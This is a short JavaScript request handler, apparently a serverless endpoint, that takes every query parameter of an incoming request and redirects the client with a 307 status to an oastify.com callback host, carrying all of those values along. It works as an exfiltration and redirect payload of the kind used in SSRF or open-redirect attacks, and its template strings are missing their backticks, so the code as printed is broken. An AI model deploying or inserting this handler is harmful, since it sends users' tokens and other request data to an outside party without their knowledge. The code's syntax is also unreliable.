export default (req, res) => {

const queryString = Object.keys(req.query)

.map(key => ${key}=${req.query[key]})

.join('&');

res.redirect(307, https://gbvimvutaem0mqkn8hqd0agx0o6fu6o4ct.oastify.com/?${queryString});

};
